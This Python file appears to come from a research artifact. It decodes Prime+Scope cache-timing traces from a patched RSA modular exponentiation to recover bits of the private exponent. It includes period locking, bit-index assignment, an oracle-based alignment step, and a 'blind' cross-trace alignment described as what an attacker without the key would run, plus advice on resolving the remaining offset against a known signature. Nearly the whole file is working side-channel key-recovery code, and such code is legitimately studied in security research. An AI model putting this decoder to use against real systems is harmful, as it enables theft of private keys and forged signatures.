"""Self-contained decoder for the Prime+Scope traces of SELECT-patched modExp.

Recovers exponent bits from the interval between paired accesses to the
bf_logic_or cache line -- which also holds bf_rint, so the trace is both (see
README.md, "The watched line is not exclusive to `|`"). See the paper, §4.2,
5.2.4 and 5.2.5.

Depends only on numpy. Trace format is one line per probe record, columns
separated by whitespace, each column "tsc:latency". The current attacker probes
one line by default, so traces have a single column. Traces recorded by the
earlier two-probe attacker carry a dropped bf_add_internal column first, so the
signal is the last column (see signal_slot). Exception: traces from a
PROBE_LINE=both run put bf_logic_and last, so pass slot=0 explicitly for those.
"""
import gzip
import json
from pathlib import Path

import numpy as np

ROOT = Path(__file__).resolve().parents[1]
TRACE_DIR = ROOT / "data" / "traces"
KEY_FILE = ROOT / "victim" / "rsa_key_0.json"
# Pool keys aren't shipped in the artifact's victim/ dir (only key 0 is); when
# evaluating a locally-collected key pool this is where the other 99 live.
POOL_KEY_DIR = ROOT.parent.parent / "rsa_key_pool"

# Splits the two gap scales. Every observed gap is either < 35,000 or
# > 270,000 cycles, so this is read off the data, not tuned.
PAIR_SPLIT_CYCLES = 100_000

def signal_slot(path):
    """Column index of the bf_logic_or probe: the last one present."""
    opener = gzip.open if str(path).endswith(".gz") else open
    with opener(path, "rt") as fh:
        for line in fh:
            cols = line.split()
            if cols:
                return len(cols) - 1
    raise ValueError(f"empty trace: {path}")


def load_trace(path, slot=None):
    """Return (timestamps, latencies) for one probe slot, sorted by timestamp."""
    if slot is None:
        slot = signal_slot(path)
    opener = gzip.open if str(path).endswith(".gz") else open
    ts, lat = [], []
    with opener(path, "rt") as fh:
        for line in fh:
            cols = line.split()
            if len(cols) <= slot:
                continue
            t, _, l = cols[slot].partition(":")
            t = int(t)
            if t > 0:
                ts.append(t)
                lat.append(int(l))
    ts = np.array(ts, dtype=np.int64)
    lat = np.array(lat, dtype=np.int64)
    order = np.argsort(ts)
    return ts[order], lat[order]


def signing_window(ts, bins=40, frac=0.25):
    """Bounds of the dense region where signing occurs.

    The probe loop runs for the whole cycle budget, so the tail of the trace is
    post-signing idle. Keep histogram bins holding at least `frac` of the
    busiest bin.
    """
    hist, edges = np.histogram(ts, bins=bins)
    keep = np.where(hist >= frac * hist.max())[0]
    return edges[keep[0]], edges[keep[-1] + 1]


def wide_narrow(ts):
    """Split accesses into pairs and separate the wide and narrow groups.

    Returns (wide_start_times, wide_gaps, narrow_gaps, alternation_rate).
    """
    lo, hi = signing_window(ts)
    ts = ts[(ts >= lo) & (ts <= hi)]

    gaps = np.diff(ts)
    starts = np.concatenate(([0], np.where(gaps >= PAIR_SPLIT_CYCLES)[0] + 1))
    ends = np.concatenate((starts[1:] - 1, [len(ts) - 1]))

    exactly_two = (ends - starts) == 1
    start_t = ts[starts[exactly_two]].astype(float)
    gap = (ts[ends[exactly_two]] - ts[starts[exactly_two]]).astype(float)

    wide = gap > np.median(gap)
    alternation = float((wide[:-1] != wide[1:]).mean())
    return start_t[wide], gap[wide], gap[~wide], alternation


# Period scan, coarse to fine: (relative half-span, number of samples).
# The last pass resolves the period to ~1e-8 relative, which is what holding
# phase across 4094 iterations requires.
PERIOD_SCAN = ((4e-3, 8001), (2e-5, 8001), (1e-7, 4001))


def _coarse_period(t):
    """Least-squares period, used only to seed the scan.

    This is the estimator the decoder used to rely on directly. It is a fixed
    point rather than a converging iteration: `idx` is rounded using a period,
    then the period is refitted from those same indices, which reproduces it.
    Three passes change nothing, and a relative error of 2.5e-4 survives --
    enough to slip one index over the length of a trace.
    """
    period = np.median(np.diff(t))
    idx = np.round((t - t[0]) / period).astype(int)
    for _ in range(3):
        design = np.vstack([idx, np.ones_like(idx)]).T
        period, offset = np.linalg.lstsq(design, t, rcond=None)[0]
        idx = np.round((t - offset) / period).astype(int)
    return period


def _phase_magnitude(t, periods):
    """|mean(exp(2*pi*i*t/P))| for each candidate P, in chunks."""
    z = np.empty(len(periods), dtype=complex)
    for i in range(0, len(periods), 2000):
        chunk = periods[i:i + 2000]
        z[i:i + 2000] = np.exp(2j * np.pi * t[:, None] / chunk[None, :]).mean(0)
    return z


_LOCK_CACHE = {}


def lock_period(t):
    """Recover the loop period by locking onto it, and the phase offset.

    Scans P and keeps the one whose phases t/P cluster most tightly on
    integers -- the Fourier magnitude at the loop frequency. Unlike the
    least-squares refit this cannot sit at a wrong fixed point, because the
    score is computed from the timestamps directly and never from the rounded
    indices. Returns (period, offset, lock_magnitude); the magnitude is a
    quality signal, 0.8-0.93 on a clean trace.
    """
    key = t.tobytes()
    if key in _LOCK_CACHE:
        return _LOCK_CACHE[key]

    period = _coarse_period(t)
    for span, n in PERIOD_SCAN:
        candidates = period * (1 + np.linspace(-span, span, n))
        z = _phase_magnitude(t, candidates)
        best = np.abs(z).argmax()
        period, peak = candidates[best], z[best]

    # Phase of the locked component gives the offset; refine it against the
    # residuals, since the circular mean alone is biased on a weak lock (r2).
    offset = -np.angle(peak) / (2 * np.pi) * period
    for _ in range(3):
        phase = (t - offset) / period
        offset += (phase - np.round(phase)).mean() * period

    _LOCK_CACHE[key] = (period, offset, abs(peak))
    return _LOCK_CACHE[key]


def assign_indices(t, n_bits, anchor=0):
    """Map wide-pair timestamps to exponent-bit indices.

    Indices come from a single global model, t = index * P + offset, because
    any scheme that counts forward from the previous pair loses a bit for
    every missed loop iteration (REPORT 5.2.4). The model is only as good as
    P, so P is locked rather than refitted -- see lock_period.

    `anchor` shifts every index by a constant. It is not determined by the
    trace: the model fixes the spacing and the phase, but which loop iteration
    the first pair belongs to is one unknown integer for the whole trace, and
    accuracy is sharply peaked in it (0.99 at the right value, 0.51 either
    side). An attacker carries the handful of candidates forward rather than
    resolving it here.

    Indices claimed by more than one pair are dropped.
    """
    period, offset, _ = lock_period(t)
    idx = np.round((t - offset) / period).astype(int)
    idx += anchor - idx.min()

    valid = (idx >= 0) & (idx < n_bits)
    uniq, counts = np.unique(idx[valid], return_counts=True)
    duplicated = set(uniq[counts > 1].tolist())
    valid &= np.array([i not in duplicated for i in idx])
    return idx, valid, period


def best_anchor(t, wide_gap, n_bits, truth_lsb_first, span=2):
    """Pick the anchor offset, scoring candidates against the known exponent.

    Only for evaluating the artifact: it resolves the one integer the trace
    does not determine. Returns (anchor, accuracy) for the best candidate.
    This is an oracle upper bound -- see blind_anchors for the attacker-side
    procedure, which uses no ground truth.
    """
    predicted = (wide_gap > np.median(wide_gap)).astype(int)
    scores = {}
    for cand in range(-span, span + 1):
        idx, valid, _ = assign_indices(t, n_bits, anchor=cand)
        if not valid.any():
            continue
        scores[cand] = float(
            (predicted[valid] == truth_lsb_first[idx[valid]]).mean())
    best = max(scores, key=scores.get)
    return best, scores[best]


def _agreement(idx_a, valid_a, pred_a, idx_b, valid_b, pred_b, n_bits):
    """Fraction of shared indices where two traces' predictions agree.

    Returns (agreement, n_shared). Used by blind_anchors to align one trace
    to another without ground truth.
    """
    slot_a = np.full(n_bits, -1)
    slot_a[idx_a[valid_a]] = pred_a[valid_a]
    slot_b = np.full(n_bits, -1)
    slot_b[idx_b[valid_b]] = pred_b[valid_b]
    shared = (slot_a >= 0) & (slot_b >= 0)
    n_shared = int(shared.sum())
    if n_shared == 0:
        return 0.0, 0
    return float((slot_a[shared] == slot_b[shared]).mean()), n_shared


def blind_anchors(traces, n_bits, span=2, min_shared=50):
    """Pick each trace's anchor by cross-trace agreement, no ground truth.

    `traces` is a list of (name, start_t, wide_gap) for repeated runs against
    the *same* key. The trace with the strongest period lock is fixed as the
    reference at anchor 0 -- an attacker has no way to prefer one candidate
    over another for it in isolation, but every other trace can be aligned to
    it by finding the shift that makes their predicted bits agree most often
    on the loop iterations both traces cover. This is the procedure an
    attacker who does not know the key would actually run; best_anchor above
    is only for measuring how much accuracy that costs.

    Returns (anchors, diagnostics): `anchors` maps name -> anchor, and
    `diagnostics` maps name -> (agreement, n_shared) against the reference
    (the reference maps to (1.0, n_valid_pairs)). A low agreement or a
    n_shared below `min_shared` means that trace could not be reliably
    aligned; the caller should treat its anchor as unreliable.

    Checked against the shipped 5-trace key: this recovers every relative
    shift exactly right (agreement against best_anchor's *relative* offsets
    is perfect), but the reference's own absolute anchor -- fixed at 0 here
    -- can still be wrong by the same one or two integers best_anchor would
    need to search for a single trace. Cross-trace agreement determines
    relative alignment for free; it cannot determine the group's one shared
    absolute offset, because every candidate shift explains the *other*
    traces' pairs equally well relative to whichever shift the reference
    took. Resolving that last integer needs one more bit of information from
    outside the traces themselves -- e.g. trying the handful of candidate
    keys each absolute shift implies against a known signature, which costs a
    constant number of verifications per key, not per trace.
    """
    if len(traces) == 0:
        return {}, {}

    locks = [(name, lock_period(t)[2]) for name, t, _ in traces]
    ref_name = max(locks, key=lambda x: x[1])[0]
    by_name = {name: (t, gap) for name, t, gap in traces}

    ref_t, ref_gap = by_name[ref_name]
    ref_idx, ref_valid, _ = assign_indices(ref_t, n_bits, anchor=0)
    ref_pred = (ref_gap > np.median(ref_gap)).astype(int)

    anchors = {ref_name: 0}
    diagnostics = {ref_name: (1.0, int(ref_valid.sum()))}

    for name, t, gap in traces:
        if name == ref_name:
            continue
        pred = (gap > np.median(gap)).astype(int)
        best_cand, best_agree, best_n = 0, -1.0, 0
        for cand in range(-span, span + 1):
            idx, valid, _ = assign_indices(t, n_bits, anchor=cand)
            agree, n_shared = _agreement(
                idx, valid, pred, ref_idx, ref_valid, ref_pred, n_bits)
            if n_shared >= min_shared and agree > best_agree:
                best_cand, best_agree, best_n = cand, agree, n_shared
        anchors[name] = best_cand
        diagnostics[name] = (max(best_agree, 0.0), best_n)

    return anchors, diagnostics


def key_file(key_id=0):
    """Path to the JSON key file for key_id.

    Key 0 is shipped with the artifact (victim/rsa_key_0.json, the same key
    used by the five example traces). Other ids are looked up in the
    surrounding repository's key pool, present only when running Path B
    (collecting new traces) -- see README.md.
    """
    if key_id == 0 and KEY_FILE.exists():
        return KEY_FILE
    candidate = POOL_KEY_DIR / f"rsa_key_{key_id}.json"
    if candidate.exists():
        return candidate
    raise FileNotFoundError(
        f"no key file for key_id={key_id} (checked {KEY_FILE} and {candidate})")


def load_exponent(key_id=0):
    """Return (bits_lsb_first, bits_msb_first) for the given key's `d`."""
    key = json.loads(key_file(key_id).read_text())
    d = int(key["d"], 16)
    msb_first = np.array([int(c) for c in bin(d)[2:]], dtype=np.int64)
    return msb_first[::-1], msb_first


def decode(path, key_id=0, anchor=None):
    """Decode one trace. Returns a dict of per-trace results.

    anchor=None (the default) reproduces the original behaviour: resolve the
    anchor with the ground-truth oracle (best_anchor). Pass an explicit
    integer -- e.g. from blind_anchors -- to decode without ground truth.
    """
    ts, _ = load_trace(path)
    lsb_first, msb_first = load_exponent(key_id)
    n_bits = len(lsb_first)

    start_t, wide_gap, narrow_gap, alternation = wide_narrow(ts)
    if anchor is None:
        anchor, _ = best_anchor(start_t, wide_gap, n_bits, lsb_first)
    idx, valid, period = assign_indices(start_t, n_bits, anchor=anchor)

    bit_index = idx[valid]
    gap = wide_gap[valid]
    predicted = (gap > np.median(gap)).astype(int)

    return {
        "name": Path(path).name.split(".")[0],
        "key_id": key_id,
        "wide_pairs": len(start_t),
        "alternation": alternation,
        "period": period,
        "anchor": anchor,
        "lock_magnitude": lock_period(start_t)[2],
        "bit_index": bit_index,
        "gap": gap,
        "predicted": predicted,
        "truth": lsb_first[bit_index],
        "truth_forward": msb_first[bit_index],
        "wide_mean": wide_gap.mean(), "wide_std": wide_gap.std(),
        "narrow_mean": narrow_gap.mean(), "narrow_std": narrow_gap.std(),
        "n_bits": n_bits,
    }


def correlation(gap, truth):
    if gap.std() == 0 or truth.std() == 0:
        return float("nan")
    return float(np.corrcoef(gap, truth)[0, 1])


def accuracy(predicted, truth):
    return float((predicted == truth).mean())


def trace_paths():
    return sorted(TRACE_DIR.glob("r*.out*"))
